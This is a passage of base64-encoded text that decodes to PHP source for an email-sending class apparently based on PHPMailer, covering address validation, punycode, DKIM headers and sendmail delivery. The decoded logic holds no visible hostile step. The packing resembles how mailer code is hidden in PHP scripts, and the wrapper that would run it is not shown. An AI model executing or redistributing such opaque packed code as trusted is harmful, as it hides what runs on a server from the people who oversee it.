QogICAgICAgICAgICBmb3JlYWNoICgkbGlzdCBhcyAkYWRkcmVzcykgew0KICAgICAgICAgICAgICAgICRhZGRyZXNzID0gdHJpbSgkYWRkcmVzcyk7DQogICAgICAgICAgICAgICAgaWYgKHN0cnBvcygkYWRkcmVzcywgJzwnKSA9PT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAkYWRkcmVzc2VzW10gPSBhcnJheSgNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZScgPT4gJycsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2FkZHJlc3MnID0+ICRhZGRyZXNzDQogICAgICAgICAgICAgICAgICAgICAgICApOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgbGlzdCgkbmFtZSwgJGVtYWlsKSA9IGV4cGxvZGUoJzwnLCAkYWRkcmVzcyk7DQogICAgICAgICAgICAgICAgICAgICRlbWFpbCA9IHRyaW0oc3RyX3JlcGxhY2UoJz4nLCAnJywgJGVtYWlsKSk7DQogICAgICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+dmFsaWRhdGVBZGRyZXNzKCRlbWFpbCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICRhZGRyZXNzZXNbXSA9IGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJyA9PiB0cmltKHN0cl9yZXBsYWNlKGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnIicsDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICInIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICksICcnLCAkbmFtZSkpLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICdhZGRyZXNzJyA9PiAkZW1haWwNCiAgICAgICAgICAgICAgICAgICAgICAgICk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuICRhZGRyZXNzZXM7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBzZXRGcm9tKCRhZGRyZXNzLCAkbmFtZSA9ICcnLCAkYXV0byA9IHRydWUpIHsNCiAgICAgICAgJGFkZHJlc3MgPSB0cmltKCRhZGRyZXNzKTsNCiAgICAgICAgJG5hbWUgICAgPSB0cmltKHByZWdfcmVwbGFjZSgnL1tcclxuXSsvJywgJycsICRuYW1lKSk7DQogICAgICAgIGlmICgoJHBvcyA9IHN0cnJwb3MoJGFkZHJlc3MsICdAJykpID09PSBmYWxzZSBvciAoISR0aGlzLT5oYXM4Yml0Q2hhcnMoc3Vic3RyKCRhZGRyZXNzLCArKyRwb3MpKSBvciAhJHRoaXMtPmlkblN1cHBvcnRlZCgpKSBhbmQgISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJGFkZHJlc3MpKSB7DQogICAgICAgICAgICAkZXJyb3JfbWVzc2FnZSA9ICR0aGlzLT5sYW5nKCdpbnZhbGlkX2FkZHJlc3MnKSAuICIgKHNldEZyb20pICRhZGRyZXNzIjsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXJyb3JfbWVzc2FnZSk7DQogICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+ZXhjZXB0aW9ucykgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgICAgICR0aGlzLT5Gcm9tICAgICA9ICRhZGRyZXNzOw0KICAgICAgICAkdGhpcy0+RnJvbU5hbWUgPSAkbmFtZTsNCiAgICAgICAgaWYgKCRhdXRvKSB7DQogICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+U2VuZGVyID0gJGFkZHJlc3M7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgcmV0dXJuIHRydWU7DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBnZXRMYXN0TWVzc2FnZUlEKCkgew0KICAgICAgICByZXR1cm4gJHRoaXMtPmxhc3RNZXNzYWdlSUQ7DQogICAgfQ0KICAgIHB1YmxpYyBzdGF0aWMgZnVuY3Rpb24gdmFsaWRhdGVBZGRyZXNzKCRhZGRyZXNzLCAkcGF0dGVybnNlbGVjdCA9IG51bGwpIHsNCiAgICAgICAgaWYgKGlzX251bGwoJHBhdHRlcm5zZWxlY3QpKSB7DQogICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9IHNlbGY6OiR2YWxpZGF0b3I7DQogICAgICAgIH0NCiAgICAgICAgaWYgKGlzX2NhbGxhYmxlKCRwYXR0ZXJuc2VsZWN0KSkgew0KICAgICAgICAgICAgcmV0dXJuIGNhbGxfdXNlcl9mdW5jKCRwYXR0ZXJuc2VsZWN0LCAkYWRkcmVzcyk7DQogICAgICAgIH0NCiAgICAgICAgaWYgKHN0cnBvcygkYWRkcmVzcywgIlxuIikgIT09IGZhbHNlIG9yIHN0cnBvcygkYWRkcmVzcywgIlxyIikgIT09IGZhbHNlKSB7DQogICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgIH0NCiAgICAgICAgaWYgKCEkcGF0dGVybnNlbGVjdCBvciAkcGF0dGVybnNlbGVjdCA9PSAnYXV0bycpIHsNCiAgICAgICAgICAgIGlmIChkZWZpbmVkKCdQQ1JFX1ZFUlNJT04nKSkgew0KICAgICAgICAgICAgICAgIGlmICh2ZXJzaW9uX2NvbXBhcmUoUENSRV9WRVJTSU9OLCAnOC4wLjMnKSA+PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BjcmU4JzsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAkcGF0dGVybnNlbGVjdCA9ICdwY3JlJzsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9IGVsc2VpZiAoZnVuY3Rpb25fZXhpc3RzKCdleHRlbnNpb25fbG9hZGVkJykgYW5kIGV4dGVuc2lvbl9sb2FkZWQoJ3BjcmUnKSkgew0KICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BjcmUnOw0KICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBpZiAodmVyc2lvbl9jb21wYXJlKFBIUF9WRVJTSU9OLCAnNS4yLjAnKSA+PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICRwYXR0ZXJuc2VsZWN0ID0gJ3BocCc7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHBhdHRlcm5zZWxlY3QgPSAnbm9yZWdleCc7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHN3aXRjaCAoJHBhdHRlcm5zZWxlY3QpIHsNCiAgICAgICAgICAgIGNhc2UgJ3BjcmU4JzoNCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pIHByZWdfbWF0Y2goJy9eKD8hKD8+KD8xKSI/KD8+XFxcWyAtfl18W14iXSkiPyg/MSkpezI1NSx9KSg/ISg/Pig/MSkiPyg/PlxcXFsgLX5dfFteIl0pIj8oPzEpKXs2NSx9QCknIC4gJygoPz4oPz4oPz4oKD8+KD8+KD8+XHgwRFx4MEEpP1tcdCBdKSt8KD8+W1x0IF0qXHgwRFx4MEEpP1tcdCBdKyk/KShcKCg/Pig/MiknIC4gJyg/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtXCcqLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHg3Rl18KD8zKSkpKig/MilcKSkpKyg/MikpfCg/MikpPyknIC4gJyhbISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8yKSg/PltceDAxLVx4MDhceDBCXHgwQ1x4MEUtISMtXFtcXS1ceDdGXXxcXFxbXHgwMC1ceDdGXSkpKicgLiAnKD8yKSIpKD8+KD8xKVwuKD8xKSg/NCkpKig/MSlAKD8hKD8xKVthLXowLTktXXs2NCx9KSg/MSkoPz4oW2EtejAtOV0oPz5bYS16MC05LV0qW2EtejAtOV0pPyknIC4gJyg/Pig/MSlcLig/ISg/MSlbYS16MC05LV17NjQsfSkoPzEpKD81KSl7MCwxMjZ9fFxbKD86KD8+SVB2NjooPz4oW2EtZjAtOV17MSw0fSkoPz46KD82KSl7N30nIC4gJ3woPyEoPzouKlthLWYwLTldWzpcXV0pezgsfSkoKD82KSg/PjooPzYpKXswLDZ9KT86Oig/Nyk/KSl8KD8+KD8+SVB2NjooPz4oPzYpKD8+Oig/NikpezV9OicgLiAnfCg/ISg/Oi4qW2EtZjAtOV06KXs2LH0pKD84KT86Oig/PigoPzYpKD8+Oig/NikpezAsNH0pOik/KSk/KDI1WzAtNV18MlswLTRdWzAtOV18MVswLTldezJ9JyAuICd8WzEtOV0/WzAtOV0pKD8+XC4oPzkpKXszfSkpXF0pKD8xKSQvaXNEJywgJGFkZHJlc3MpOw0KICAgICAgICAgICAgY2FzZSAncGNyZSc6DQogICAgICAgICAgICAgICAgcmV0dXJuIChib29sZWFuKSBwcmVnX21hdGNoKCcvXig/ISg/PiI/KD8+XFxcWyAtfl18W14iXSkiPyl7MjU1LH0pKD8hKD8+Ij8oPz5cXFxbIC1+XXxbXiJdKSI/KXs2NSx9QCkoPz4nIC4gJ1shIy1cJyorXC8tOT0/Xi1+LV0rfCIoPz4oPz5bXHgwMS1ceDA4XHgwQlx4MENceDBFLSEjLVxbXF0tXHg3Rl18XFxcW1x4MDAtXHhGRl0pKSoiKScgLiAnKD8+XC4oPz5bISMtXCcqK1wvLTk9P14tfi1dK3wiKD8+KD8+W1x4MDEtXHgwOFx4MEJceDBDXHgwRS0hIy1cW1xdLVx4N0ZdfFxcXFtceDAwLVx4RkZdKSkqIikpKicgLiAnQCg/Pig/IVthLXowLTktXXs2NCx9KSg/PlthLXowLTldKD8+W2EtejAtOS1dKlthLXowLTldKT8pKD8+XC4oPyFbYS16MC05LV17NjQsfSknIC4gJyg/PlthLXowLTldKD8+W2EtejAtOS1dKlthLXowLTldKT8pKXswLDEyNn18XFsoPzooPz5JUHY2Oig/Pig/PlthLWYwLTldezEsNH0pKD8+OicgLiAnW2EtZjAtOV17MSw0fSl7N318KD8hKD86LipbYS1mMC05XVs6XF1dKXs4LH0pKD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDZ9KT8nIC4gJzo6KD8+W2EtZjAtOV17MSw0fSg/PjpbYS1mMC05XXsxLDR9KXswLDZ9KT8pKXwoPz4oPz5JUHY2Oig/PlthLWYwLTldezEsNH0oPz46JyAuICdbYS1mMC05XXsxLDR9KXs1fTp8KD8hKD86LipbYS1mMC05XTopezYsfSkoPz5bYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNH0pPycgLiAnOjooPz4oPzpbYS1mMC05XXsxLDR9KD8+OlthLWYwLTldezEsNH0pezAsNH0pOik/KSk/KD8+MjVbMC01XXwyWzAtNF1bMC05XXwxWzAtOV17Mn0nIC4gJ3xbMS05XT9bMC05XSkoPz5cLig/PjI1WzAtNV18MlswLTRdWzAtOV18MVswLTldezJ9fFsxLTldP1swLTldKSl7M30pKVxdKSQvaXNEJywgJGFkZHJlc3MpOw0KICAgICAgICAgICAgY2FzZSAnaHRtbDUnOg0KICAgICAgICAgICAgICAgIHJldHVybiAoYm9vbGVhbikgcHJlZ19tYXRjaCgnL15bYS16QS1aMC05LiEjJCUmXCcqK1wvPT9eX2B7fH1+LV0rQFthLXpBLVowLTldKD86W2EtekEtWjAtOS1dezAsNjF9JyAuICdbYS16QS1aMC05XSk/KD86XC5bYS16QS1aMC05XSg/OlthLXpBLVowLTktXXswLDYxfVthLXpBLVowLTldKT8pKiQvc0QnLCAkYWRkcmVzcyk7DQogICAgICAgICAgICBjYXNlICdub3JlZ2V4JzoNCiAgICAgICAgICAgICAgICByZXR1cm4gKHN0cmxlbigkYWRkcmVzcykgPj0gMyBhbmQgc3RycG9zKCRhZGRyZXNzLCAnQCcpID49IDEgYW5kIHN0cnBvcygkYWRkcmVzcywgJ0AnKSAhPSBzdHJsZW4oJGFkZHJlc3MpIC0gMSk7DQogICAgICAgICAgICBjYXNlICdwaHAnOg0KICAgICAgICAgICAgZGVmYXVsdDoNCiAgICAgICAgICAgICAgICByZXR1cm4gKGJvb2xlYW4pIGZpbHRlcl92YXIoJGFkZHJlc3MsIEZJTFRFUl9WQUxJREFURV9FTUFJTCk7DQogICAgICAgIH0NCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIGlkblN1cHBvcnRlZCgpIHsNCiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uX2V4aXN0cygnaWRuX3RvX2FzY2lpJykgYW5kIGZ1bmN0aW9uX2V4aXN0cygnbWJfY29udmVydF9lbmNvZGluZycpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcHVueWVuY29kZUFkZHJlc3MoJGFkZHJlc3MpIHsNCiAgICAgICAgaWYgKCR0aGlzLT5pZG5TdXBwb3J0ZWQoKSBhbmQgIWVtcHR5KCR0aGlzLT5DaGFyU2V0KSBhbmQgKCRwb3MgPSBzdHJycG9zKCRhZGRyZXNzLCAnQCcpKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICRkb21haW4gPSBzdWJzdHIoJGFkZHJlc3MsICsrJHBvcyk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmhhczhiaXRDaGFycygkZG9tYWluKSBhbmQgQG1iX2NoZWNrX2VuY29kaW5nKCRkb21haW4sICR0aGlzLT5DaGFyU2V0KSkgew0KICAgICAgICAgICAgICAgICRkb21haW4gPSBtYl9jb252ZXJ0X2VuY29kaW5nKCRkb21haW4sICdVVEYtOCcsICR0aGlzLT5DaGFyU2V0KTsNCiAgICAgICAgICAgICAgICBpZiAoKCRwdW55Y29kZSA9IGRlZmluZWQoJ0lOVExfSUROQV9WQVJJQU5UX1VUUzQ2JykgPyBpZG5fdG9fYXNjaWkoJGRvbWFpbiwgMCwgSU5UTF9JRE5BX1ZBUklBTlRfVVRTNDYpIDogaWRuX3RvX2FzY2lpKCRkb21haW4pKSAhPT0gZmFsc2UpIHsNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHN1YnN0cigkYWRkcmVzcywgMCwgJHBvcykgLiAkcHVueWNvZGU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkYWRkcmVzczsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIHNlbmQoKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBpZiAoISR0aGlzLT5wcmVTZW5kKCkpIHsNCiAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gJHRoaXMtPnBvc3RTZW5kKCk7DQogICAgICAgIH0NCiAgICAgICAgY2F0Y2ggKHBocG1haWxlckV4Y2VwdGlvbiAkZXhjKSB7DQogICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciA9ICcnOw0KICAgICAgICAgICAgJHRoaXMtPnNldEVycm9yKCRleGMtPmdldE1lc3NhZ2UoKSk7DQogICAgICAgICAgICBpZiAoJHRoaXMtPmV4Y2VwdGlvbnMpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyAkZXhjOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgICAgICB9DQogICAgfQ0KICAgIHB1YmxpYyBmdW5jdGlvbiBwcmVTZW5kKCkgew0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgJHRoaXMtPmVycm9yX2NvdW50ID0gMDsNCiAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyICA9ICcnOw0KICAgICAgICAgICAgZm9yZWFjaCAoYXJyYXlfbWVyZ2UoJHRoaXMtPlJlY2lwaWVudHNRdWV1ZSwgJHRoaXMtPlJlcGx5VG9RdWV1ZSkgYXMgJHBhcmFtcykgew0KICAgICAgICAgICAgICAgICRwYXJhbXNbMV0gPSAkdGhpcy0+cHVueWVuY29kZUFkZHJlc3MoJHBhcmFtc1sxXSk7DQogICAgICAgICAgICAgICAgY2FsbF91c2VyX2Z1bmNfYXJyYXkoYXJyYXkoDQogICAgICAgICAgICAgICAgICAgICR0aGlzLA0KICAgICAgICAgICAgICAgICAgICAnYWRkQW5BZGRyZXNzJw0KICAgICAgICAgICAgICAgICksICRwYXJhbXMpOw0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKChjb3VudCgkdGhpcy0+dG8pICsgY291bnQoJHRoaXMtPmNjKSArIGNvdW50KCR0aGlzLT5iY2MpKSA8IDEpIHsNCiAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCR0aGlzLT5sYW5nKCdwcm92aWRlX2FkZHJlc3MnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICBmb3JlYWNoIChhcnJheSgNCiAgICAgICAgICAgICAgICAnRnJvbScsDQogICAgICAgICAgICAgICAgJ1NlbmRlcicsDQogICAgICAgICAgICAgICAgJ0NvbmZpcm1SZWFkaW5nVG8nDQogICAgICAgICAgICApIGFzICRhZGRyZXNzX2tpbmQpIHsNCiAgICAgICAgICAgICAgICAkdGhpcy0+JGFkZHJlc3Nfa2luZCA9IHRyaW0oJHRoaXMtPiRhZGRyZXNzX2tpbmQpOw0KICAgICAgICAgICAgICAgIGlmIChlbXB0eSgkdGhpcy0+JGFkZHJlc3Nfa2luZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgY29udGludWU7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICR0aGlzLT4kYWRkcmVzc19raW5kID0gJHRoaXMtPnB1bnllbmNvZGVBZGRyZXNzKCR0aGlzLT4kYWRkcmVzc19raW5kKTsNCiAgICAgICAgICAgICAgICBpZiAoISR0aGlzLT52YWxpZGF0ZUFkZHJlc3MoJHRoaXMtPiRhZGRyZXNzX2tpbmQpKSB7DQogICAgICAgICAgICAgICAgICAgICRlcnJvcl9tZXNzYWdlID0gJHRoaXMtPmxhbmcoJ2ludmFsaWRfYWRkcmVzcycpIC4gJyAocHVueUVuY29kZSkgJyAuICR0aGlzLT4kYWRkcmVzc19raW5kOw0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2V0RXJyb3IoJGVycm9yX21lc3NhZ2UpOw0KICAgICAgICAgICAgICAgICAgICAkdGhpcy0+ZWRlYnVnKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgcGhwbWFpbGVyRXhjZXB0aW9uKCRlcnJvcl9tZXNzYWdlKTsNCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgICAgaWYgKCR0aGlzLT5hbHRlcm5hdGl2ZUV4aXN0cygpKSB7DQogICAgICAgICAgICAgICAgJHRoaXMtPkNvbnRlbnRUeXBlID0gJ211bHRpcGFydC9hbHRlcm5hdGl2ZSc7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkdGhpcy0+c2V0TWVzc2FnZVR5cGUoKTsNCiAgICAgICAgICAgIGlmICghJHRoaXMtPkFsbG93RW1wdHkgYW5kIGVtcHR5KCR0aGlzLT5Cb2R5KSkgew0KICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2VtcHR5X21lc3NhZ2UnKSwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICB9DQogICAgICAgICAgICAkdGhpcy0+TUlNRUhlYWRlciA9ICcnOw0KICAgICAgICAgICAgJHRoaXMtPk1JTUVCb2R5ICAgPSAkdGhpcy0+Y3JlYXRlQm9keSgpOw0KICAgICAgICAgICAgJHRlbXBoZWFkZXJzICAgICAgPSAkdGhpcy0+TUlNRUhlYWRlcjsNCiAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gJHRoaXMtPmNyZWF0ZUhlYWRlcigpOw0KICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLj0gJHRlbXBoZWFkZXJzOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5NYWlsZXIgPT0gJ21haWwnKSB7DQogICAgICAgICAgICAgICAgaWYgKGNvdW50KCR0aGlzLT50bykgPiAwKSB7DQogICAgICAgICAgICAgICAgICAgICR0aGlzLT5tYWlsSGVhZGVyIC49ICR0aGlzLT5hZGRyQXBwZW5kKCdUbycsICR0aGlzLT50byk7DQogICAgICAgICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPm1haWxIZWFkZXIgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ1RvJywgJ3VuZGlzY2xvc2VkLXJlY2lwaWVudHM6OycpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAkdGhpcy0+bWFpbEhlYWRlciAuPSAkdGhpcy0+aGVhZGVyTGluZSgnU3ViamVjdCcsICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcih0cmltKCR0aGlzLT5TdWJqZWN0KSkpKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIGlmICghZW1wdHkoJHRoaXMtPkRLSU1fZG9tYWluKSAmJiAhZW1wdHkoJHRoaXMtPkRLSU1fc2VsZWN0b3IpICYmICghZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZV9zdHJpbmcpIHx8ICghZW1wdHkoJHRoaXMtPkRLSU1fcHJpdmF0ZSkgJiYgZmlsZV9leGlzdHMoJHRoaXMtPkRLSU1fcHJpdmF0ZSkpKSkgew0KICAgICAgICAgICAgICAgICRoZWFkZXJfZGtpbSAgICAgID0gJHRoaXMtPkRLSU1fQWRkKCR0aGlzLT5NSU1FSGVhZGVyIC4gJHRoaXMtPm1haWxIZWFkZXIsICR0aGlzLT5lbmNvZGVIZWFkZXIoJHRoaXMtPnNlY3VyZUhlYWRlcigkdGhpcy0+U3ViamVjdCkpLCAkdGhpcy0+TUlNRUJvZHkpOw0KICAgICAgICAgICAgICAgICR0aGlzLT5NSU1FSGVhZGVyID0gcnRyaW0oJHRoaXMtPk1JTUVIZWFkZXIsICJcclxuICIpIC4gc2VsZjo6Q1JMRiAuIHN0cl9yZXBsYWNlKCJcclxuIiwgIlxuIiwgJGhlYWRlcl9ka2ltKSAuIHNlbGY6OkNSTEY7DQogICAgICAgICAgICB9DQogICAgICAgICAgICByZXR1cm4gdHJ1ZTsNCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIHJldHVybiBmYWxzZTsNCiAgICAgICAgfQ0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gcG9zdFNlbmQoKSB7DQogICAgICAgIHRyeSB7DQogICAgICAgICAgICBzd2l0Y2ggKCR0aGlzLT5NYWlsZXIpIHsNCiAgICAgICAgICAgICAgICBjYXNlICdzZW5kbWFpbCc6DQogICAgICAgICAgICAgICAgY2FzZSAncW1haWwnOg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gJHRoaXMtPnNlbmRtYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgICAgICBjYXNlICdzbXRwJzoNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5zbXRwU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgICAgICBjYXNlICdtYWlsJzoNCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5tYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgICAgICBkZWZhdWx0Og0KICAgICAgICAgICAgICAgICAgICAkc2VuZE1ldGhvZCA9ICR0aGlzLT5NYWlsZXIgLiAnU2VuZCc7DQogICAgICAgICAgICAgICAgICAgIGlmIChtZXRob2RfZXhpc3RzKCR0aGlzLCAkc2VuZE1ldGhvZCkpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAkdGhpcy0+JHNlbmRNZXRob2QoJHRoaXMtPk1JTUVIZWFkZXIsICR0aGlzLT5NSU1FQm9keSk7DQogICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuICR0aGlzLT5tYWlsU2VuZCgkdGhpcy0+TUlNRUhlYWRlciwgJHRoaXMtPk1JTUVCb2R5KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBjYXRjaCAocGhwbWFpbGVyRXhjZXB0aW9uICRleGMpIHsNCiAgICAgICAgICAgICR0aGlzLT5zZXRFcnJvcigkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgJHRoaXMtPmVkZWJ1ZygkZXhjLT5nZXRNZXNzYWdlKCkpOw0KICAgICAgICAgICAgaWYgKCR0aGlzLT5leGNlcHRpb25zKSB7DQogICAgICAgICAgICAgICAgdGhyb3cgJGV4YzsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICByZXR1cm4gZmFsc2U7DQogICAgfQ0KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBzZW5kbWFpbFNlbmQoJGhlYWRlciwgJGJvZHkpIHsNCiAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+U2VuZGVyKSBhbmQgc2VsZjo6aXNTaGVsbFNhZmUoJHRoaXMtPlNlbmRlcikpIHsNCiAgICAgICAgICAgIGlmICgkdGhpcy0+TWFpbGVyID09ICdxbWFpbCcpIHsNCiAgICAgICAgICAgICAgICAkc2VuZG1haWxGbXQgPSAnJXMgLWYlcyc7DQogICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICRzZW5kbWFpbEZtdCA9ICclcyAtb2kgLWYlcyAtdCc7DQogICAgICAgICAgICB9DQogICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICBpZiAoJHRoaXMtPk1haWxlciA9PSAncW1haWwnKSB7DQogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzJzsNCiAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgJHNlbmRtYWlsRm10ID0gJyVzIC1vaSAtdCc7DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgJHNlbmRtYWlsID0gc3ByaW50Zigkc2VuZG1haWxGbXQsIEBlc2NhcGVzaGVsbGNtZCgkdGhpcy0+U2VuZG1haWwpLCAkdGhpcy0+U2VuZGVyKTsNCiAgICAgICAgaWYgKCR0aGlzLT5TaW5nbGVUbykgew0KICAgICAgICAgICAgZm9yZWFjaCAoJHRoaXMtPlNpbmdsZVRvQXJyYXkgYXMgJHRvQWRkcikgew0KICAgICAgICAgICAgICAgIGlmICghQCRtYWlsID0gcG9wZW4oJHNlbmRtYWlsLCAndycpKSB7DQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBwaHBtYWlsZXJFeGNlcHRpb24oJHRoaXMtPmxhbmcoJ2V4ZWN1dGUnKSAuICR0aGlzLT5TZW5kbWFpbCwgc2VsZjo6U1RPUF9DUklUSUNBTCk7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAnVG86ICcgLiAkdG9BZGRyIC4gIlxuIik7DQogICAgICAgICAgICAgICAgZnB1dHMoJG1haWwsICRoZWFkZXIpOw0KICAgICAgICAgICAgICAgIGZwdXRzKCRtYWlsLCAkYm9keSk7DQogICAgICAgICAgICAgICAgJHJlc3VsdCA9IHBjbG9zZSgkbWFpbCk7DQogICAgICAgICAgICAgICAgJHRoaXMtPmRvQ2FsbGJhY2soKCRyZXN1bHQgPT0gMCksIGFycmF5KA0KICAgICAgICAgICAgICAgICAgICAkdG9BZGRyDQogICAgICAgICAgICAgICAgKSwgJHRoaXMtPmNjLCAkdGhpcy0+YmNjLCAkdGhpcy0+U3ViamVjdCwgJGJvZHksICR0aGlzLT5Gcm9tKTsNCiAgICAgICAgICAgICAgICBpZiAoJHJlc3